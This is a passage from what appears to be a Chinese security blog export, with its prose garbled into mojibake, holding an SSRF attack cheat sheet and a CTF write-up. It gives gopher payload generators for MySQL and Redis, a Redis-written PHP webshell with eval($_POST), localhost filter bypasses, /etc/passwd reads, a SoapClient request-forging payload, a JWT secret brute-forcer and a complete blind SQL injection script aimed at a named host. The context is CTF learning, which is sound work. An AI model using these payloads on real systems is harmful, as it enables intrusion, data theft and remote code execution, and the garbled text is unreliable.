","text":"SSRFç®€ä»‹SSRFæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡å™¨å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªæ¼æ´ï¼Œè®©æœåŠ¡å™¨å»è¯·æ±‚é€šå¸¸è¯·æ±‚ä¸åˆ°çš„ä¸œè¥¿ã€‚ä¸€èˆ¬ç”¨æ¥åœ¨å¤–ç½‘æ¢æµ‹æˆ–æ”»å‡»å†…ç½‘æœåŠ¡å®ä¾‹ä»£ç  &lt;?php$url=$_GET['url'];echo file_get_contents($url);?&gt; SSRFç›¸å…³å‡½æ•°file_get_contentsï¼šèƒ½å°†urlæˆ–è€…æ–‡ä»¶å‘ˆç°ç»™ç”¨æˆ·fsockopen:èƒ½æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥ï¼Œå®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ï¼Œä¼ è¾“åŸå§‹æ•°æ®curl_exec:â€¦.. SSRFåˆ©ç”¨è¯»å–ç³»ç»Ÿæ–‡ä»¶file://ä¼ªåè®®:è¯»å–æœ¬åœ°æ–‡ä»¶file://C:/flag.txt gopher://åè®®gopheræ˜¯ä¸€ä¸ªä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿ åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„FTPã€Telnetã€Redisã€Mysqlï¼Œå¯ä»¥è¿›è¡Œgetã€postè¯·æ±‚ åˆ©ç”¨æ–¹å¼1.æ„é€ http get/postè¯·æ±‚æ¶ˆæ¯2.å¯¹è¯·æ±‚æ¶ˆæ¯è¿›è¡Œurlç¼–ç 3.å°†ç¼–ç åçš„å­—ç¬¦ä¸²ä¸­çš„%0Aæ›¿æ¢ä¸º%0D%0A4.å°†æœ€ç»ˆçš„å­—ç¬¦ä¸²åœ¨è¿›è¡Œä¸€æ¬¡URLç¼–ç 5.æ‹¼æ¥åè®®å¤´ã€è¯·æ±‚åœ°å€gopherè½¬åŒ–è„šæœ¬ï¼š from urllib.parse import quote as urlencodedef gopher(data):#ç«¯å£è®°å¾—æ›´æ¢ stream = f&quot;&quot;&quot;POST /index.php HTTP/1.1Host: 127.0.0.1:47852Content-Type: application/x-www-form-urlencodedContent-Length: {len(data)}Connection: close{data}&quot;&quot;&quot;.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;) g = &quot;gopher://127.0.0.1:47852/_&quot; + urlencode(stream) return urlencode(g)print(gopher('a=1')) ä½œç”¨gopherå¯ä»¥è‡ªå®šä¹‰å‘é€postä»¥åŠgetçš„è¯·æ±‚å†…å®¹ ssrfæ‰«æç«¯å£å¯ä»¥å…ˆçœ‹/etc/hostsçœ‹ipï¼Œç„¶åæ‰«æç«¯å£å¯ä»¥ä»1w-2wï¼Œçœ‹é¢˜ç›®è¯´æ˜ï¼Œæ²¡è¯´å°±æ˜¯æ‰«6wä¸ª HTTPè¯·æ±‚èµ°ç§SSRFæ”»å‡»mysqlåŸç†ï¼šæˆ‘ä»¬çŸ¥é“ssrfå°±æ˜¯ä¼ªé€ æœåŠ¡ç«¯å‘èµ·è¯·æ±‚ï¼Œè¿™é‡Œå°±æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬ä½¿ç”¨æœ¬åœ°æŠ“çš„åŒ…å†™å…¥åˆ°gopheræ”»å‡»æ•°æ®åŒ…é‡Œé¢ï¼Œå¯ä»¥æ‰“é¢˜ç›®é‡Œé¢çš„ï¼Ÿé‚£å°±æ˜¯å› ä¸ºåœ¨ssrfé¢˜ç›®é‡Œé¢ï¼Œæˆ‘ä»¬å‘èµ·çš„è¯·æ±‚å°±ç›¸å½“äºåœ¨é¢˜ç›®çš„æœ¬åœ°è¿›è¡Œæ”»å‡»äº†ï¼Œæ‰€ä»¥æ•ˆæœæ˜¯ä¸€æ ·çš„ SSRFæ¼æ´ç»“åˆgopherç³»ç»Ÿæ”»å‡»å†…ç½‘æœªæˆæƒmysql(å³æ²¡æœ‰å¯†ç )ï¼Œå¹¶è·å–ç³»ç»Ÿshellçš„æ–¹æ³• mysqlé€šä¿¡åè®®å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨æœ‰ä¸‰ç§æ–¹æ³•ï¼š1.unixå¥—æ¥å­—ï¼šåªèƒ½åœ¨å®¢æˆ·ç«¯å’ŒmysqlæœåŠ¡å™¨åœ¨åŒä¸€å°ç”µè„‘ä¸Šæ‰è¡Œ2.å†…å­˜å…±äº«/å‘½åç®¡é“ï¼šwindowç³»ç»Ÿ3.TCP/IPå¥—æ¥å­—ï¼šæ˜¯åœ¨ä»»ä½•ç³»ç»Ÿä¸‹éƒ½å¯ä»¥ä½¿ç”¨çš„æ–¹å¼ï¼Œä¹Ÿæ˜¯ä½¿ç”¨æœ€å¤šçš„è¿æ¥æ–¹å¼ï¼Œå³ï¼šmysql -h127.0.0.1 -uroot -prootPSï¼šè¿™é‡Œä¸å¯ä»¥ä½¿ç”¨localhostï¼Œå› ä¸ºlocalhostä½¿ç”¨çš„æ˜¯unixçš„å¥—æ¥å­— mysqlå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äº¤äº’è¿‡ç¨‹mysqlå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äº¤äº’ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µ:connection phaseï¼ˆè¿æ¥é˜¶æ®µæˆ–è€…å«è®¤è¯é˜¶æ®µï¼‰command phase(å‘½ä»¤é˜¶æ®µ)åœ¨è¿æ¥é˜¶æ®µåŒ…æ‹¬æˆ‘é¦–ä¿å’Œè®¤è¯åŒ…ï¼Œä¸»è¦å…³æ³¨è®¤è¯æ•°æ®åŒ… æ„é€ æ”»å‡»æ•°æ®åŒ…1.ä½¿ç”¨tcpdump tcpdump -ilo0 port 3306 -w sql.pcapng 2.ä½¿ç”¨wiresharkæ‰“å¼€å­˜å‚¨äº†æ•°æ®åŒ…çš„æ–‡ä»¶3.æ¥ä¸‹æ¥æ‰¾åˆ°Login Requestçš„åŒ…å¹¶å³é”®å•å‡»Followä¸€ä¸‹é‡Œé¢çš„TCP Stream4.æ‰§è¡Œä»¥ä¸‹æ“ä½œ 5.å°†ä¸Šé¢çš„æ•°æ®å¤åˆ¶ä¸‹æ¥ï¼Œä½¿ç”¨ä¸€ä¸‹è„šæœ¬ï¼Œæ„é€ gopheræ”»å‡»åŒ…ï¼š #encoding:utf-8import sysdef result(s): a=[s[i:i+2] for iin range(0,len(s),2)] return &quot;curl gopher://127.0.0.1:3306/_%&quot; + &quot;%&quot;.join(a)s='''åå…­è¿›åˆ¶æ•°æ®æµæ”¾åœ¨è¿™é‡Œ'''.replace('\\n', '')print(result(s)+'--output -') 6.è¿è¡Œè„šæœ¬ ï¼Œæ‰§è¡Œè„šæœ¬ç»“æœ GET SHELLåˆ©ç”¨mysqlå†™é©¬ï¼š select '&lt;?php phpinfo(); ?&gt;' into out file &quot;/tmp/1.php&quot;; ç„¶åä½¿ç”¨gopherä¼ªé€ ï¼Œç„¶åæ‰“è¿‡å»PSï¼šå¦‚æœé¢˜ç›®æƒé™ç»™çš„å¾ˆé«˜ï¼Œæˆ–è€…ç”¨äº†æ¯”è¾ƒæ—§çš„mysqlç‰ˆæœ¬ï¼Œè¯´æ˜å°±æ˜¯è¦è®©ä½ ç”¨è¿™ä¸ªåŠæ³•ï¼Œå¦åˆ™ä½ å†™è¿‡å»çš„é©¬å°†ä¼šé¢ä¸´ä¸€ä¸ªæƒé™é—®é¢˜ å¦‚æœæ²¡æœ‰å†™å…¥æƒé™ä¸ºnullï¼Œé‚£ä¹ˆå°±æ˜¯ç”¨logå†™é©¬å³å¯ SSRFæ”»å‡»RedisRedisé€šä¿¡æ–¹å¼gopherå‘é€redisè¯·æ±‚ç”¨ä»¥ä¸‹è„šæœ¬ç›´æ¥æ‰“ï¼Œå¯æ›¿æ¢å†…å®¹ï¼Œç„¶åå†urlencodeä¸€ä¸‹å³å¯ from urllib.parseimport quote as urlencodedefgopher(): stream = f&quot;&quot;&quot;*2$4auth$6123123*2$3get$4name&quot;&quot;&quot;.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;) g = &quot;gopher://127.0.0.1:8000/_&quot; + urlencode(stream) return gprint(&quot;curl &quot;+gopher()) å¤‡ä»½crontabåå¼¹shellcentosæ‰èƒ½ç”¨ å¤‡ä»½æ–‡ä»¶å†™é©¬å¦‚æœredisä¸phpåœ¨ä¸€èµ·ï¼Œå¯ä»¥ç›´æ¥å†™åˆ°/var/www/html/shell.php def webshell():s='''auth 123123set mars &quot;&lt;?php eval($_POST[0]);?&gt;&quot;config set dir /tmp/config set dbfilename shell.phpsavequit''' print(urlencode(gopher(s))) DICT://çš„åˆ©ç”¨çˆ†ç ´ç«¯å£url=dict://127.0.0.1:8000 é€šè¿‡å›æ˜¾çœ‹ç«¯å£æ˜¯å¦å¼€å¯ çˆ†ç ´å¯†ç url=dict://127.0.0.1:8000/auth;123123(å¯†ç ) é€šè¿‡å›æ˜¾çœ‹å¯†ç ï¼Œå¯†ç ä¸€èˆ¬æ˜¯123456æˆ–è€…adminæˆ–è€…123123 å¤‡ä»½æ–‡ä»¶å†™é©¬dict://127.0.0.1:8001/config:set:dbfilename:webshell.phpdict://127.0.0.1:8001/config:set:dir:/tmpdict://127.0.0.1:8001/set:webshell:&quot;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f\\x28\\x29\\x3b\\x20\\x3f\\x3e&quot; ä¸»ä»å¤åˆ¶RCEä½¿ç”¨ä¸¤ä¸ªå·¥å…·ï¼š https://github.com/n0b0dyCN/redis-rogue-serverhttps://github.com/Ridter/redis-rce ä½¿ç”¨redis-rceåŠ è½½redis-rogue-server-masterçš„æ¶æ„æ¨¡å—exp.soï¼Œå³å¯å®ç°RCE å†™æ— æŸæ–‡ä»¶https://github.com/r35tart/RedisWriteFile ä½¿ç”¨æ­¤è½¯ä»¶è”é€šå³å¯å†™æ— æŸæ–‡ä»¶ SSRF Trickç»•è¿‡è®¿é—®é™åˆ¶å¯¹è®¿é—®çš„é™åˆ¶fileåè®®+åŸŸå+è¯»æ–‡ä»¶åœ°å€ file://localhost/var/www/html/config.php 1.è¿‡æ»¤fileï¼Œå¯ä½¿ç”¨File://å¤§å°å†™ç»•è¿‡è¯•è¯•2.æäº¤å†…å®¹æœ«å°¾æ·»åŠ /ç­‰å†…å®¹å¯ä½¿ç”¨?æˆ–è€…#è¿›è¡Œæ³¨é‡Š3.urlå¯ä»¥åŠ å‚æ•°ç»•è¿‡è¿‡æ»¤ å¯¹æœ¬åœ°çš„è®¿é—®é™åˆ¶/å¯¹è®¿é—®åè®®çš„é™åˆ¶è·³è½¬/è§£æåˆ°127.0.0.1ï¼šhttp://127.0.0.1.nip.io/flag.phpç¼–ç ç»•è¿‡ï¼šè¿›åˆ¶è½¬æ¢http://0x7f.0.0.1/flag.phpç‰¹æ®Šå­—ç¬¦ç»•è¿‡http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ /flag.phphttp://[0:0:0:0:0:ffff:127.0.0.1]/flag.phphttp://127ã€‚0ã€‚0ã€‚1/flag.phphttp://127.1/flag.phphttp://[::]:80/flag.phphttp://127.0.0.1./flag.php é‡åˆ°éœ€è¦127.0.0.1è®¿é—®ï¼šç›´æ¥ä½¿ç”¨ä»¥ä¸‹å†…å®¹è¿›è¡Œç»•è¿‡ X-Forwarded-For:127.0.0.1X-Forwarded:127.0.0.1Forwarded-For:127.0.0.1Forwarded:127.0.0.1X-Forwarded-Host:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1Ali-CDN-Real-IP:127.0.0.1Cdn-Src-Ip:127.0.0.1Cdn-Real-Ip:127.0.0.1CF-Connecting-IP:127.0.0.1X-Cluster-Client-IP:127.0.0.1WL-Proxy-Client-IP:127.0.0.1Proxy-Client-IP:127.0.0.1Fastly-Client-Ip:127.0.0.1True-Client-Ip:127.0.0.1 è¿›åˆ¶çš„è½¬æ¢å¯ä»¥ä½¿ç”¨ä¸€äº›ä¸åŒçš„è¿›åˆ¶æ›¿ä»£ipåœ°å€ï¼Œä»è€Œç»•è¿‡WAF åˆ©ç”¨DNSè§£æå¦‚æœä½ è‡ªå·±æœ‰åŸŸåçš„è¯ï¼Œå¯ä»¥åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.0.1ã€‚ åˆ©ç”¨@ç»•è¿‡http://www.baidu.com@127.0.0.1ä¸http://127.0.0.1è¯·æ±‚æ˜¯ç›¸åŒçš„ file_get_contents()ä¸­çš„trickæœ‰å…³file_get_contents()å‡½æ•°çš„ä¸€ä¸ªtrickï¼Œå¯ä»¥çœ‹ä½œæ˜¯SSRFçš„ä¸€ä¸ªé»‘é­”æ³•ï¼Œå½“PHPçš„ file_get_contents()å‡½æ•°åœ¨é‡åˆ°ä¸è®¤è¯†çš„ä¼ªåè®®å¤´æ—¶å€™ä¼šå°†ä¼ªåè®®å¤´å½“åšæ–‡ä»¶å¤¹ï¼Œé€ æˆç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè¿™æ—¶å€™åªéœ€ä¸æ–­å¾€ä¸Šè·³è½¬ç›®å½•å³å¯è¯»åˆ°æ ¹ç›®å½•çš„æ–‡ä»¶ã€‚ httpsssss://../../../../../../etc/passwd https://www.freebuf.com/articles/network/255456.html PHP parse_url()æ¼æ´äº§ç”ŸåŸå› ï¼š Parse_urlå’Œè®¿é—®urlæ˜¯ä¸¤ä»¶äº‹ï¼Œè¿™ä¸¤ä»¶äº‹å¯¹urlçš„å¤„ç†å­˜åœ¨å·®å¼‚ æ¼æ´åˆ©ç”¨ï¼š http://y1ng.vip\\@flag.authenticator.das.ctf:80/åˆ™ä¼šè®¿é—®åˆ°flag.authenticator.das.ctf:80/ Apache SSRFä»»æ„è¯»å–ï¼šhttps://github.com/ev0A/ArbitraryFileReadList/ è¯»é…ç½®æ–‡ä»¶ï¼Œå‘ç°å…¶ä»–ç«¯å£ æ— gopherå’Œdictå¦‚ä½•ssrfä½¿ç”¨soapååºåˆ—åŒ–å¯ä»¥å‘é€postè¯·æ±‚ &lt;?php$target = 'http://123.206.216.198/bbb.php';$post_string = 'a=b&amp;flag=aaa';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: xxxx=1234' );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^','%0d%0a',$aaa);$aaa = str_replace('&amp;','%26',$aaa);echo $aaa;?&gt; DNSé‡ç»‘å®šéªŒè¯å’Œè®¿é—®åˆ†å¼€ï¼ŒéªŒè¯ä¸€ä¸ªåˆæ³•çš„åŸŸåï¼Œç„¶ååœ¨è¿™ä¸ªåŸŸåå†™å†™ä¸€ä¸ªé‡å®šå‘çš„æŒ‡ä»¤å¯ä»¥é‡å®šå‘çš„åŸŸåç”Ÿæˆï¼š https://requestrepo.com/#/https://lock.cmpxchg8b.com/rebinder.html CTFä¸­çš„å†…ç½‘æ¸—é€flagä¸€èˆ¬ä¸åœ¨æ‹¿shellçš„è¿™ä¸ªæœºå™¨ä¸Šå¦‚æœæ˜¯æœ‰ä¸€ä¸ªå…±åŒä¸Šä¼ çš„åœ°æ–¹ï¼Œæ„å‘³ç€uploadç›®å½•ä¸‹æ˜¯ä¸€ä¸ª777çš„æƒé™ï¼Œå¯ä»¥ç›´æ¥å»æ‰«è·å–åˆ«é˜Ÿä¼ä¸Šä¼ çš„ä¿¡æ¯å¯¹äºæ‰“å†…ç½‘ï¼šé€šè¿‡ifconfigçœ‹ipåœ°å€ï¼ˆwindowsï¼‰é€šè¿‡/etc/hostsé¦–å…ˆæ‰«æipçœ‹æ˜¯å¦æœ‰å­˜æ´»ä¸»æœºï¼Œå†å°†æ‰€æœ‰å­˜æ´»ä¸»æœºipåˆ—å‡ºæ¥ï¼ŒHTTPæœåŠ¡-&gt;æ‰«æœåŠ¡ï¼ˆç«¯å£ï¼‰ æ‰«æå·¥å…·ï¼šmasscan nmap gobyç­‰å·¥å…· getshellä»¥åå‘ç°æƒé™ä¸å¤Ÿï¼Œå¯ä»¥ä½¿ç”¨psï¼ˆè·å–è¿›ç¨‹ï¼Œçœ‹çœ‹è¿è¡Œäº†ä»€ä¹ˆè¿›ç¨‹ï¼‰æˆ–è€…å¼€netstatè‡ªå·±å†80ç«¯å£ï¼Œç„¶åshellåœ¨8006ç«¯å£è¯¥å¦‚ä½•è§£å†³ï¼Ÿfrpå·¥å…·ï¼š","link":"/2021/08/31/ssrf%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"title":"åˆ·é¢˜è®°å½•","text":"1127å¯ä»¥çœ‹æºç ï¼Œæ‰€ä»¥ç›´æ¥æŸ¥çœ‹æºç  if (req.session.won &gt;= 100) { console.log(&quot;you won&quot;) const token = jwt.sign ( { id : req.session.want_to_eat, is_win : &quot;true&quot; }, env.parsed.rockyou, { expiresIn: 3600 * 12 } ) res.cookie(&quot;token&quot;, token, { maxAge: 3600 * 12, httpOnly: true }); req.session.is_win = &quot;true&quot; res.redirect(&quot;/award&quot;) return } // å¦‚æœåœ£è¯è€äººèµ¢äº†5æ¬¡é‚£ä¹ˆä½ å°±è¾“äº† if ( req.session.santa &gt; 5 ) { req.session.destroy() res.render(&quot;failed&quot;) return; } èµ¢100æ¬¡å°±èƒœåˆ©ï¼Œæ˜¾ç„¶ä¸å¤ªå¯èƒ½ï¼Œäºæ˜¯ç»§ç»­çœ‹çœ‹å…¶ä»–åœ°æ–¹ï¼Œè¿™é‡Œå‘ç°sessionå¯ä»¥è¢«playerçš„å±æ€§èµ‹å€¼ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å°†playerè¿™é‡Œå°±å¯¹wonå±æ€§èµ‹å€¼&gt;100ä¸å°±å¯ä»¥äº†å—ï¼Œåˆæ­¥æ¨æ–­å¯èƒ½å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ä¹‹ç±» app.get('/start', (req, res)=&gt;{ if ( player.name ) { for (let i in player) { if (req.session.hasOwnProperty(i)) req.session[i] = player[i] else { res.end(&quot;Do you think i am stupid?&quot;) player = {} req.session.destroy() return } } ä½†æ˜¯åœ¨å¦ä¸€ä¸ªåœ°æ–¹ï¼šå‘ç°æœ‰å¯¹wonçš„é‡æ–°èµ‹å€¼ï¼Œæ‰€ä»¥åº”è¯¥è¿˜è¦å†è€ƒè™‘ä¸€ä¸‹åŸå‹é“¾æ±¡æŸ“çš„ä¸€ä¸ªé¡ºåºé—®é¢˜ app.post('/start', (req, res)=&gt;{ if ( !req.cookies.token || !req.session.name ) { res.status(403).send(&quot;you are not allowed to visit this page&quot;) return } if ( !req.session.won ) req.session.won = 0 if ( !req.session.santa ) req.session.santa = 0 æœ€åå†POST /è¿™ä¸ªè·¯ç”±ä¸­çœ‹åˆ°ï¼Œæœç„¶æœ‰å¯ä»¥æ±¡æŸ“çš„åœ°æ–¹ player[i] = tempPlayer[i] æ‹ä¸€ä¸‹æ€è·¯ï¼šå…ˆå¯¹POST /æ±¡æŸ“ä¸€ä¸‹player â€”â€”&gt;åˆ°POST /start åˆå§‹åŒ–sessionâ€”â€”&gt;GET /start å¯¹sessionè¿›è¡Œèµ‹å€¼ï¼Œå°†å…¶wonå±æ€§èµ‹å€¼ç»™sessionä½†æ˜¯æˆ‘åˆçœ‹äº†ä¸€ä¸‹ä¼¼ä¹è¿™æ ·è¿˜æ˜¯ä¸å¤Ÿçš„,/awardä¸­è¿˜æœ‰ä¸€ä¸ªis_winè¦æ˜¯trueï¼Œè¿™æ · if (req.user.is_win !== 'true' || req.session.is_win !== 'true' ) å‘ä¸Šçœ‹äº†ä¸€ä¸‹ï¼ŒPOST /startä¸­æœ‰å¯¹è¿™ä¸€é¡¹è¿›è¡Œtureçš„èµ‹å€¼ï¼Œæ‰€ä»¥åº”è¯¥è¿˜è¦å†å›æ¥post /startä¸­å¯¹è¿™ä¸ªè¿›è¡Œèµ‹å€¼ é¦–å…ˆæŠŠpostæ±¡æŸ“ä¸€ä¸‹é‚£ä¸ªwonå±æ€§ï¼Œç„¶åæŠŠtokenå¤åˆ¶å›å»æ›¿æ¢ä¸€ä¸‹å»è®¿é—®å°±å¯ä»¥å‘ç°playerå·²ç»101åˆ†äº† ç„¶åå°±æœ‰tokenè®©ä½ è·³è½¬åˆ°/award ç„¶åæ— äº‹å‘ç”Ÿï¼Ÿã€? å›å»çœ‹çœ‹æºç ï¼Œè¿™è¾¹ä¼¼ä¹è¦æ³¨å…¥ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“idåœ¨å“ªï¼Œæ„Ÿè§‰æ˜¯è¦ä¼ªé€ jwtäºæ˜¯å†çœ‹çœ‹== let patt = /union|like|pragma|savepoint|vacuum|detach|alter|attach|insert|update|release|rollback|load|create|drop|delete|explain|regexp|=|&gt;|&lt;|&quot;|'/i if ( req.user.id.match(patt) ) { res.status(403).end(&quot;Never Trust Your User&quot;) return } db.get(`SELECT ITEM,LOG FROM AWARD WHERE id=${req.user.id}`,function(err,row){ if (!row) { res.render(&quot;reward&quot;, {&quot;award&quot;: &quot;&quot;, &quot;log&quot;: &quot;&quot;}) return } if (row[&quot;ITEM&quot;] &amp;&amp; row[&quot;LOG&quot;]){ res.render(&quot;reward&quot;, {&quot;award&quot;: row[&quot;ITEM&quot;], &quot;message&quot; : row[&quot;LOG&quot;]} ) } else res.render(&quot;reward&quot;, {&quot;award&quot;: &quot;&quot;, &quot;log&quot;: &quot;&quot;}) })}) ç”¨å·¥å…·å‘ç°å‡ºä¸æ¥ï¼Œäºæ˜¯åœ¨å›å»æ‰¾æ‰¾ä¿¡æ¯ï¼šå‘ç°æ˜¯è¦ç”¨rockyouçš„å­—å…¸æ‰è¡Œ import jwtjwt_str = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc193aW4iOiJmYWxzZSIsImlhdCI6MTYzMDU3MzUzOSwiZXhwIjoxNjMwNjE2NzM5fQ.mAH_mgq1JvEtgyJ3CpfF0xN-7ca_scyUrbuFZzPOIXs&quot;path = &quot;C:/Users/10452/Desktop/rockyou.txt&quot;alg = &quot;HS256&quot;with open(path,encoding='utf-8') as f: for line in f: key_ = line.strip() try: jwt.decode(jwt_str,verify=True,key=key_,algorithms=[&quot;HS256&quot;]) print('found key! --&gt; ' + key_) break except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): print('found key! --&gt; ' + key_) break except(jwt.exceptions.InvalidSignatureError): continue else: print(&quot;key not found!&quot;) æ‹¿åˆ°keyç„¶åå»æ¢ä¸€ä¸‹userçœ‹çœ‹æºç è¿™ä¸ªçœ‹èµ·æ¥å°±æ˜¯è¦ç›²æ³¨äº†å§ åº”è¯¥å°±æ˜¯è¦ç”¨è¿™ä¸ªidæ¥è¿›è¡Œç›²æ³¨äº†å§ é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æ„é€ sqlæ³¨å…¥è¯­å¥ï¼Œç„¶åæ›¿æ¢åˆ°idé‚£è¾¹é‡æ–°è¿›è¡ŒåŠ å¯†ï¼Œä½†æ˜¯æ¯æ¬¡è¦åˆ°è¿™ä¸ª/awardéƒ½éœ€è¦é‡æ–°æ„é€ idï¼Œå°±è¦ä¼ªé€ jwtï¼Œè¿™é‡Œå°±ç¼–å†™ä¸€ä¸‹pythonè„šæœ¬è·‘ä¸€ä¸‹ï¼Ÿé¦–å…ˆçœ‹çœ‹å¦‚ä½•æ„é€ ç›²æ³¨è¯­å¥ï¼šæ ¹æ®ä»–çš„ç»“æœï¼Œå¦‚æœæŸ¥è¯¢åˆ°å°±è¿”å›ç»“æœï¼ŒæŸ¥è¯¢ä¸åˆ°å°±è¿”å›ç©ºå¥½åƒï¼Œç„¶åæ ¹æ®è¿™ä¸ªè¿‡æ»¤å†…å®¹ï¼Œçœ‹èµ·æ¥ä¸åƒæ˜¯mysqlï¼Œæ¯•ç«Ÿmysqlæ²¡æœ‰vacuumè¿™ä¸ªä¸œè¥¿å§ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªæ˜¯sqliteçš„ä¸œè¥¿ï¼Œæ‰€ä»¥è¿™é¢˜åº”è¯¥æ˜¯sqliteç›²æ³¨ç›²æ³¨ä¸­çš„æˆªå–æ²¡å’‹è¿‡æ»¤ï¼Œå°±ç›´æ¥ç”¨substrå°±å¯ä»¥ï¼Œç„¶åæ¯”è¾ƒç¬¦è¿‡æ»¤äº†ï¼Œå¾ˆå¤šï¼Œçœ‹äº†ä¸€ä¸‹inæ²¡è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œè€ƒè™‘ç”¨inè¯•è¯•,ç”±äºå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨charå‡½æ•°è¿›è¡Œç»•è¿‡ import jwtimport requestsimport stringurl=&quot;http://a.y1ng.vip:1127/&quot;s=requests.session()game=&quot;s%3AAUHzfM13c2l68I75rIKMDLtiU8GKtpxJ.H3ugRxCwtqH1Ey6%2F1IClRNwrt8Ba5uE0FSihnsXd2kE&quot;def jwt_boom(): jwt_str = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc193aW4iOiJmYWxzZSIsImlhdCI6MTYzMDU3MzUzOSwiZXhwIjoxNjMwNjE2NzM5fQ.mAH_mgq1JvEtgyJ3CpfF0xN-7ca_scyUrbuFZzPOIXs&quot; path = &quot;C:/Users/10452/Desktop/rockyou.txt&quot; with open(path,encoding='utf-8') as f: for line in f: key_ = line.strip() try: jwt.decode(jwt_str,verify=True,key=key_,algorithms=[&quot;HS256&quot;]) print('found key! --&gt; ' + key_) break except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): print('found key! --&gt; ' + key_) break except(jwt.exceptions.InvalidSignatureError): continue else: print(&quot;key not found!&quot;)def jwt_encode(payload_t): json = { &quot;id&quot;: payload_t, &quot;is_win&quot;: &quot;true&quot;, &quot;iat&quot;: 1630654737, &quot;exp&quot;: 1630697937 } token = jwt.encode(json, &quot;fuckoff123&quot;, algorithm='HS256') return tokendef ord_tran(s): fin=&quot;&quot; for i in s: fin +=f&quot;{ord(i)},&quot; #print(f&quot;chr({fin[:-1]})&quot;) return f&quot;char({fin[:-1]})&quot;def sql_injection(payload): result=&quot;&quot; for i in range(1,10000): for j in range(0,128): payload_f=f&quot;1 and char({j}) in (substr(({payload}),{i},1));--&quot; #print(payload_f) token=jwt_encode(payload_f) headers={ &quot;cookie&quot;:f&quot;game={game}; token={token}&quot; } #print(headers) r=s.get(url=url+'award',headers=headers).text #print(r) if &quot;Turkey&quot; in r: result += chr(j) print(result) breakif __name__ == &quot;__main__&quot;: #jwt_boom() #key=fuckoff123 #payload=&quot;SELECT group_concat(name) FROM sqlite_master&quot;#AWARD,sqlite_autoindex_AWARD_1,SECRET,sqlite_autoindex_SECRET_1 #ord_tran(&quot;SECRET&quot;) #payload=f&quot;SELECT group_concat(sql) FROM sqlite_master WHERE tbl_name in ({ord_tran('SECRET')})&quot;#fl4ggg payload=f&quot;SELECT group_concat(fl4ggg) FROM SECRET&quot;#almost,flag{f7f0f684-0abf-ffe1-c561-a186d17a0b1d} sql_injection(payload) sqliteæ³¨å…¥ï¼šhttps://xz.aliyun.com/t/8627#toc-3 2023ä¸€å¼€å§‹æˆ‘è¾“å…¥ä»»ä½•çš„urléƒ½æ²¡ç”¨ï¼Œä¸€ç›´è¯´åç¼€ä¸å¯¹ï¼ŒåŸæ¥æ˜¯è¦åœ¨urlåé¢åŠ ä¸€ä¸ªpngã€‚ã€‚ã€‚ã€‚æ‰€ä»¥å¯ä»¥ç”¨fileåè®®è¯»ä¸€ä¸‹æºç ï¼Œç”±äºè¿‡æ»¤äº†varï¼Œå¯ä»¥é€šè¿‡äºŒæ¬¡urlç¼–ç è¿›è¡Œç»•è¿‡ï¼Œä¸ºä»€ä¹ˆç”¨?å·å‘¢ã€‚å…¶å®è¿™é‡Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªåˆ†å‰²çš„ä½œç”¨å§ï¼Œ?pngä¸å½±å“å‰é¢åœ°å€çš„è®¿é—® file:///%25%37%36ar/www/html/index.php?png &lt;?phperror_reporting(0);if(isset($_GET['url'])){ $url = $_GET['url']; if(preg_match(&quot;/flag|apache|conf|var|proc|log/i&quot; ,$url)){ $dieMess = &quot;Dangerous content.&quot;; } else{ $end = substr($url, strlen($url) - 3, strlen($url)); if($end === &quot;png&quot;){ $curlobj = curl_init($url); curl_setopt($curlobj, CURLOPT_TIMEOUT, 200); curl_setopt($curlobj, CURLOPT_URL, $url); curl_setopt($curlobj, CURLOPT_HEADER, 